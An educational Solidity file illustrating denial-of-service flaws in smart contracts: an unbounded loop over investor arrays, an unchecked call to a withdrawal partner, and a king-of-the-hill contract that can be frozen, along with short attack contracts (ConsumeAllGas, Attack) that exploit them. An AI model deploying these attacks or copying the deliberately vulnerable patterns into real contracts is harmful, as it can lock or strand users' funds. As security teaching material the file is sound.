//SPDX-License-Identifier:MIT
pragma solidity ^0.8.11;

// sources - https://solidity-by-example.org/ , https://blog.sigmaprime.io/solidity-security.html#delegatecall
// This category is very broad, but fundamentally consists of attacks where users can leave the contract inoperable 
// for a small period of time, or in some cases, permanently.

//1) External calls without gas stipends 

// the partner can transfer the partnership to onsumeAllGas contract and when ether is withdrawn by the contract
// all the gas is transferrend and used and thus the transaction gets reverted every time and the contaract is frozen.
contract TrickleWallet {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        require(partner == address(0) || msg.sender == partner);
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance/100;
        // perform a call without checking return
        // the recipient can revert, the owner will still get their share
        payable(partner).call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance()public view returns (uint) {
        return address(this).balance;
    }
}

contract ConsumeAllGas {
    receive () external payable {
        // an assert consumes all transaction gas, unlike a
        //revert which returns the remaining gas
        assert(1==2);
    }
}
// ro prevent such dos gas limitations is applies
//partner.call.gas(50000).value(amountToSend)();

// 2) Looping through externally manipulated mappings or arrays 
/*  Notice that the loop in this contract runs over an array which can be artificially inflated. 
An attacker can create many user accounts making the investor array large. In principle this can 
be done such that the gas required to execute the for loop exceeds the block gas limit, essentially 
making the distribute() function inoperable.
*/

contract DistributeTokens {
    address public owner; // gets set somewhere
    address[] investors; // array of investors
    uint[] investorTokens; // the amount of tokens each investor gets

    // ... extra functionality, including transfertoken()

    function invest() public payable {
        investors.push(msg.sender);
        investorTokens.push(msg.value * 5); // 5 times the wei sent
        }

    function distribute() public {
        require(msg.sender == owner); // only owner
        for(uint i = 0; i < investors.length; i++) {
            // here transferToken(to,amount) transfers "amount" of tokens to the address "to"
 //           transferToken(investors[i],investorTokens[i]); token transfer function of erc20 (not commented in actual code)
        }
    }
}

// 3) Denial of acceptiong ether
// The goal of KingOfEther is to become the king by sending more Ether than
//the previous king. Previous king will be refunded with the amount of Ether he sent.
// the attack contract can become the king by sending in enough amount
// Since it cannot receive ether , no ther account can become a king since all tx to the function 
// will be reverted.

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
